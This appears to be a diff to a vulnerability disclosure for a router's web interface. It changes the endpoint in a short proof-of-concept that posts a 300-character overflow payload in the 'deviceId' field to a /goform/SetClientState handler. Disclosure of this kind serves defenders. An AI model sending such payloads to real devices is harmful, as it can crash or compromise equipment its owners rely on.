@@ -23,7 +23,7 @@ get value from deviceId ,and if deviceId and limitEn are not null, get into line
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/formSetClientState"
+url = "http://192.168.1.13/goform/SetClientState"
 payload = 'A'*300 + '\n'
 
 r = requests.post(url, data={'deviceId': payload, 'limitEn': 1})
